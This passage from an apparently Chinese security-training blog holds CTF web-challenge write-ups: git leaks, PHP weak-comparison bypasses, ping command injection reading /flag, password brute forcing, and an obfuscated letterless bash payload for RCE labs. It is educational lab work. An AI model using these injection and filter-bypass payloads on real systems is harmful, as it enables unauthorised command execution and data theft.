src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285354435-734529d2-935c-4781-86a3-68687cf16dec.png">访问a.php，继续本地访问</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285419128-e2199ca9-7d00-49c7-9a5b-401ab70d3796.png"></p><p>访问secretttt.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285450910-917580a0-aaa3-4690-bd64-7ff13973b325.png"></p><h2 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a><font style="color:rgb(0, 0, 0);">[LitCTF 2023]就当无事发生</font></h2><p>考的是git泄露，一般来说是要扫网站目录的，但是这道题直接把网站给出来了，还是GitHub上的，那就不需要了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742287084460-601bf63c-e156-4d3d-8069-c96183440fc7.png"></p><p>访问一下<a href="https://probiusofficial.github.io/">https://ProbiusOfficial.github.io</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742286974685-5bbbb367-6207-49f6-949d-b966a44c599a.png"></p><p>找他GitHub</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742287161937-e0f33ae2-844a-43ee-abf4-c4bda15f3226.png"></p><p>看提交记录<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742287185214-7a3ad195-faab-407b-84f9-9e8010ecf9aa.png"></p><p>看看版本及时间，方便找flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742286943655-8a53fcd9-7269-45c4-a8ab-c5dd61e7102d.png"></p><p>找23年45月份的，Flag在此</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742287110602-372c97e2-d986-4618-a508-d352ffbddc7d.png"></p><h2 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a><font style="color:rgb(0, 0, 0);">[第五空间 2021]WebFTP</font></h2><p>看标签是git泄露，所以目录扫描一下</p><p>py dirsearch.py -u <a href="http://node7.anna.nssctf.cn:24629/">http://node7.anna.nssctf.cn:24629/</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288819588-8f766bb5-307c-4c44-87fd-151b60277364.png"></p><p>访问README.md</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288803245-af96f404-c8ad-470a-ab0a-7286af04e003.png"></p><p>找到用户名和密码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742289023634-338561df-1969-4cff-9772-f2d12cb91626.png"></p><p>找flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742289040913-10fc6f66-e818-42f1-9b82-d7f4b9987cb2.png"></p><p>之后查看phpinfo.php找flag就行</p><p>Ctrl+f全局搜索flag。搜NSSCTF也行<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742289296273-04b21aea-7767-4f0b-b0f2-615f3104e128.png"></p><p>在 dirsearch中又看到phpinfo.php，访问一下还是刚才的页面，刚才的步骤麻烦了<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742289311932-1c161b7f-40cd-4b79-b899-b927b45e1f21.png"></p><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a><font style="color:rgb(0, 0, 0);">[SWPUCTF 2021 新生赛]easyrce</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288140022-aa885f2c-e4f1-4f6e-afdb-1bc34da008c4.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288175231-323aba4a-053e-479f-84ec-368e953de2f3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288205112-2beefb72-998c-4f39-af71-b17b04fc3df9.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742288222987-568b72b9-70c5-41f0-bd7d-83c6308a80f2.png"></p><h2 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a><font style="color:rgb(0, 0, 0);">[LitCTF 2023]Ping</font></h2><p>ping命令通常用来作为网络可用性的检查。ping命令可以对一个网络地址发送测试数据包，看该网络地址是否有响应并统计响应时间，以此测试网络。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742290804173-04bd1f3f-4f23-4e3a-b7dd-88b1dccae9d5.png"></p><p>分号隔开，看看文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742290824878-08cc78c7-5604-4925-b1f8-1c731941baea.png"></p><p>ls看看根目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742290966166-5d38530c-5850-4ad5-b3c0-417d0776c774.png"></p><p>cat &#x2F;flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291038267-9c39b73d-ba51-4dbc-97c6-c8c951b40b70.png"></p><h2 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a><font style="color:rgb(0, 0, 0);">[SWPUCTF 2022 新生赛]奇妙的MD5</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291212989-4e8ce82c-c34b-4339-8913-721ba6d62303.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291242327-4ac612c4-e4e4-419b-96f6-570ef6c2b82d.png"></p><p>php弱比较，数组绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291286547-5c625893-deab-45c1-b615-56f608350ddb.png"></p><p>还是数组绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291580536-3f01cd27-3c48-4fc0-b450-6068e04b56b4.png"></p><h2 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a><font style="color:rgb(0, 0, 0);">[BJDCTF 2020]easy_md5</font></h2><p>相应标头有hint</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291866525-87cbd11d-1c5e-40f0-8b3f-b7d33beb58ce.png"></p><p>提交一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742291911604-d637a1c5-7d2e-4578-85c3-872cd9afe77a.png"></p><p>出现了这个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742292057505-580c0f56-aaf5-4431-a952-3527b3e14ce9.png"></p><p>看源代码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742292180717-2f2c7364-c817-46cf-88d3-cdc7f2ea1def.png"></p><p>还是弱比较,数组绕过,或者也可以直接访问levell14.php也行,</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742292264323-d250e12a-d3d1-4cb2-b323-c5acefea4725.png"></p><p>出现了这个页面</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742292273640-cead8cf4-9d22-48a4-9714-83305fccf1d2.png"></p><p>数组绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742292547508-1e598cc6-6766-4e5e-a0b1-2c176f001b52.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025 Spring Week1</title>
      <link href="/2025/03/09/HnuSecTraining/2025SpringWeek1/"/>
      <url>/2025/03/09/HnuSecTraining/2025SpringWeek1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454242595-b4ff32e5-1846-448b-afe7-0e14a740dc83.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454163893-c490aed6-3a58-4457-b530-5d3a634b3334.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741454115703-d74aa735-19fe-44ae-b31b-bd213a421243.png"></p><h1 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h1><p><del>既然提示了flag可能在文件里.所以flag就是:</del></p><p><del>flag{hello_world}或xxxctf{we1c0me!}!</del></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741345655889-63b229cb-6572-416f-8cda-1ba645247553.png"></p><p>算了,直接看.md文件源代码</p><p>flag{we1c0me_t0_CTF!}</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a><font style="background-color:rgb(247, 248, 250);">view_source</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357136118-c537114e-5221-44eb-9d94-8752707eea8a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357160565-9936e7a7-744c-4cd9-8931-703ceff3ffb3.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357174122-2e3cc884-cb1c-4838-a8b9-788c9108d9cd.png"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a><font style="background-color:rgb(247, 248, 250);">get_post</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357252448-1ce4a510-91e7-483c-af1e-accd7c28456d.png"></p><h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5_match</span>(<span class="params">prefix=<span class="string">&quot;19ca14&quot;</span>, max_length=<span class="number">6</span></span>):</span><br><span class="line">    chars = string.ascii_letters + string.digits  <span class="comment"># 可选字符集（字母+数字）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            test_string = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_hash = hashlib.md5(test_string.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> md5_hash.startswith(prefix):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到匹配项: <span class="subst">&#123;test_string&#125;</span> -&gt; <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> test_string</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配项&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_md5_match()</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出:</span></span><br><span class="line"><span class="comment">#找到匹配项: 36 -&gt; 19ca14e7ea6328a42e0eb13d585e4c22</span></span><br></pre></td></tr></table></figure><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a><font style="background-color:rgb(247, 248, 250);">robots</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441028199-fb2f8d19-6017-482e-99ae-cc04cf5159b0.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441038475-5df885e1-28a7-474d-8d3c-2889acbf02a1.png"></p><p>robots.txt文件是一个文本文件，使用任何一个常见的<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91/6282252?fromModule=lemma_inlink">文本编辑</a>器，比如Windows<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/56370294?fromModule=lemma_inlink">系统安装</a>了Notepad，就可以创建和编辑它<sup> </sup><sup>[1]</sup>。robots.txt是一个协议，而不是一个命令。robots.txt是<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/0?fromModule=lemma_inlink">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F/4972146?fromModule=lemma_inlink">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p><p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a>下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<a href="https://baike.baidu.com/item/%E7%99%BE%E5%BA%A6/6699?fromModule=lemma_inlink">百度</a>官方建议，仅当您的网站包含不希望被<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E5%BD%95/7279593?fromModule=lemma_inlink">搜索引擎收录</a>的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><p>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p><p>所以直接搜robots.txt<br><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441075896-8132863c-d978-47cd-a713-37f9fcc0b5e7.png"></p><p>再搜flag_ls_h3re.php就行了</p><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441093308-8a45095d-c0ef-4e25-a2bc-84db789b4fac.png"></h1><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">backup</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441350687-885d330a-2a8f-43df-bbe1-fefa7159b54b.png"></p><p><font style="color:rgb(77, 77, 77);">如果网站存在备份文件，常见的备份文件后缀名有：“.</font><font style="color:rgb(252, 85, 49);">git</font><font style="color:rgb(77, 77, 77);">” 、“.</font><a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020"><font style="color:rgb(252, 85, 49);">svn</font></a><font style="color:rgb(77, 77, 77);">”、“ .swp”“.~”、“.bak”</font></p><p><font style="color:rgb(77, 77, 77);">测试到.bak下载了一个文件，打开就是flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441384605-35f4b7ea-ca4f-44d1-a162-c4964ad9252a.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741441414961-f5f11e46-c7ef-421a-9953-bd6768d51ca1.png"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">cookie</font></h2><p>hackbar找cookie</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442192048-def40780-3547-4658-a20c-a637dc7c8585.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442278243-6819ffe5-8309-4f3c-bb0e-e15d422083d6.png"></p><p>hackbar中mode转为raw直接看flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442375256-d57d8f0a-1a66-4a6c-8d2d-7c811b87446e.png"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">disabled_button</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442471567-3c4f7ed5-080e-4d1d-911f-a431985b1a91.png"></p><p>我偏按，改一下这个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442791425-e41390bf-6361-4377-8921-43f5557e60a0.png"></p><p>去掉disabled就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442839493-fcaac9cf-05a1-4834-81cb-4f61bd6145d1.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741442863075-de444b32-99cf-4f90-888d-60a72ef18df6.png"></p><p>相关知识：<a href="https://www.w3school.com.cn/tags/att_input_disabled.asp">HTML &lt;input&gt; disabled 属性</a></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a><font style="color:rgb(29, 33, 41);">simple_js</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741443805546-060b7f45-efb3-471a-8b13-f390925be0e1.png"></p><p>pass这堆数解密为<font style="color:rgb(64, 64, 64);">FAUX PASSWORD HAHA,那么这堆java代码无论怎么执行,都返回FAUX PASSWORD HAHA,但是源代码有这样的16进制数</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444056540-5faf4687-27a8-45fe-b518-9bafbeb00770.png"></p><p>解码后得到786OsErtk12,盲猜flag,组合一下得到<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);"> Cyberpeace{</font>786OsErtk12<font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">}</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444165385-434f294f-768c-453d-a066-569072470d01.png"></p><p><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">艹,真对了</font></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">xff_referer</font></h2><p>ez_http,直接hackbar操作就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444249946-0a560715-e2c7-4db4-820d-d28b6cb76f75.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444270017-ae968c0b-6d2b-4c64-b1d1-39ac60e93734.png"></p><p>得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444321941-3d60e355-3f15-4cee-b13f-fafd8bc4e0c5.png"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">weak_auth</font></h2><p>盲猜密码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444420790-fea11a88-2cd2-4850-b6f2-5242828b4996.png"></p><p>nb<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444460728-b0a9f247-aab6-4a8d-9179-e1fb039a8f69.png"></p><p>算了爆破一下吧,也练习一下操作</p><p>在爆破点加载用户名和密码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741444980563-d506efd0-bfa4-43cf-a926-c4ba0b7f4f62.png"></p><p>取得一系列响应</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445076049-427d1771-a1bf-4b18-9276-18ca2b4f2286.png"></p><p>直接找就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445497436-f2e582aa-0949-4035-b071-86599ef670e1.png"></p><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">command_execution</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445685856-463ecc85-5c21-4e43-a168-ad82904ab3ed.png"></p><p>不写waf,某些hacker会直接操作你的文件!</p><p>展示文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741445676979-32a9d8f8-282f-4016-ab18-9b473c2b1032.png"></p><p>到根目录<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446794846-c87f5979-69b1-4804-a94c-d88b668e6bfe.png"></p><p>找flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446761007-778b4021-7718-4e31-ad46-7ae9ddd648e7.png"></p><p>或者这样找也行,但是flag一被修饰就不行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446552073-f4084147-3287-49c8-b61f-b6a0a54fabf6.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446576636-43c3529b-4704-45a6-8895-8b054ad13399.png"></p><p>cat &#x2F;home&#x2F;flag.txt 或者nl &#x2F;home&#x2F;flag.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446628498-052c30bf-aa80-4ee2-8420-ad462928565d.png"></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a><font style="color:rgb(39, 46, 59);background-color:rgb(247, 248, 250);">simple_php</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741446978252-07351b45-03e3-4e03-b2fe-43f83c9768d1.png"></p><p>原理:</p><p>a&#x3D;’0’中&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较,所以$a&#x3D;&#x3D;0成立</p><p>其次,$a的值原来是ASCLL码值,不为零,所以就绕过去了</p><p>b[]&#x3D;12345被视作数组不是数字,绕过去</p><p>$b的值显然大于1234</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741447095292-8cf72102-728f-4bec-a2ef-195aa9ee283b.png"></p><h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><p>已经写过了几份笔记,还有课件,都是知识~</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/50616406/1741454675237-aced9a5c-5d64-4888-92f1-b0d8331325e9.jpeg"></p><p><a href="https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/mgcgb109aq54kgnr">PHP学习及练习</a></p><p><a href="https://www.yuque.com/yangfanyuanhang-0t2rm/gygw48/gyi25qn9bp6qonuw">PHP语言的漏洞</a></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357601274-4a73363b-515c-4c50-b29a-a02ea9ed0b98.pdf">PHP1.pdf</a></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/50616406/1741357602678-b1a6f584-7d9f-41a6-b7cd-8b89182731d6.pdf">PHP2.pdf</a></p><h1 id="REC命令执行"><a href="#REC命令执行" class="headerlink" title="REC命令执行"></a>REC命令执行</h1><p><a href="https://www.yuque.com/yangfanyuanhang-0t2rm/dbb38x/gvbosz1b0tb6gahu">0~9题在这里</a></p><p>之前就部署好了<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357756248-816ea714-dc55-4416-970d-c3af001d61eb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357723940-59aeb6f1-c11d-4a37-bc7c-7876134dc0a7.png"></p><p>后面几题没看到<font style="color:rgb(31, 35, 40);">get_flag.php</font>文件,所以在nss上写了</p><h2 id="RCE-labs-Level-10-无字母命令执行-二进制整数替换"><a href="#RCE-labs-Level-10-无字母命令执行-二进制整数替换" class="headerlink" title="[RCE-labs]Level 10 - 无字母命令执行_二进制整数替换"></a>[RCE-labs]Level 10 - 无字母命令执行_二进制整数替换</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741357939954-959b4471-f964-47df-b6f9-67ccd48bd445.png"></p><p>一开始没什么思路，看了一下writeup下载了一个使用的脚本</p><p><a href="https://github.com/ProbiusOfficial/bashFuck">https://github.com/ProbiusOfficial/bashFuck</a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360785399-1245e6a0-6e4a-4899-8529-4306a096e60f.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741361396291-5572ffcd-3756-4651-b94f-c9d10d3f9718.png"></p><p>脚本生成的一个palyload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Charset : <span class="comment"># $ &#x27; ( ) 0 &lt; \ &#123; &#125;</span></span><br><span class="line">Total Used: <span class="number">10</span></span><br><span class="line">Total length = <span class="number">444</span></span><br><span class="line">Payload = $<span class="number">0</span>&lt;&lt;&lt;$<span class="number">0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360934423-4324d1ac-e8be-49d5-96b9-d0d5a36743f2.png"></p><p>url编码一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741360955905-c1f35c9e-83a9-49d3-b582-4ad96a722a0d.png"></p><h2 id="RCE-labs-Level-11-无字母命令执行-整数1的特殊变量替换"><a href="#RCE-labs-Level-11-无字母命令执行-整数1的特殊变量替换" class="headerlink" title="[RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换"></a>[RCE-labs]Level 11 - 无字母命令执行_整数1的特殊变量替换</h2><p>不是这道题有bug?传123不报WAF?看writeup也不行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448949940-a9815dca-0c53-4fdd-9455-d51bec500d5a.png"></p><p>上一题还正常</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448921384-437919df-d9ef-4dec-b78f-0f48c213bf00.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741448913779-8e6da91a-ba4b-4b59-81c0-6d2e0da914ba.png"></p><p>算了给出playload吧,不知道对不对.</p><p>毕竟没有对**<font style="color:rgb(51, 51, 51);"> # $ ‘ ( ) 0 &lt; \ { } </font>**<font style="color:rgb(51, 51, 51);">几项WAF,在题目给的渠道生成playload:</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449489113-e234230f-bbd7-4a4b-acc5-0bb1d2131408.png"></p><p>url编码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">240</span>%3C%3C%3C%<span class="number">240</span>%5C%3C%5C%3C%5C%3C%5C%<span class="number">24</span>%5C<span class="string">&#xx27;</span></span><br></pre></td></tr></table></figure><h2 id="RCE-labs-Level-13-无字母命令执行-特殊扩展替换任意数字"><a href="#RCE-labs-Level-13-无字母命令执行-特殊扩展替换任意数字" class="headerlink" title="[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字"></a><font style="color:rgb(0, 0, 0);">[RCE-labs]Level 13 - 无字母命令执行_特殊扩展替换任意数字</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449804609-f0d8a68c-4dae-41c3-9578-60f73e7b9bc3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449819852-e0da65d5-0895-4593-a119-391348b46663.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449813675-88adc40d-bd11-4cc4-8bf2-9c81e0ddfd89.png"></p><p><del>脚本真好用,学废了</del></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450113853-b5a5b902-cae6-4666-b0c0-111b217eb5c8.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741449778425-fe87c76b-886d-4c3a-9852-d89bffdd1b24.png"></p><h2 id="RCE-labs-Level-14-7字符RCE"><a href="#RCE-labs-Level-14-7字符RCE" class="headerlink" title="[RCE-labs]Level 14 - 7字符RCE"></a><font style="color:rgb(0, 0, 0);">[RCE-labs]Level 14 - 7字符RCE</font></h2><p>这过滤个啥啊?代码BUG?长度都是9了啊?</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1741450259057-e94b6607-4a5c-449f-979d-c5c62333b85a.png"></p><p>换一种解题方式,就满足条件了</p><p><img 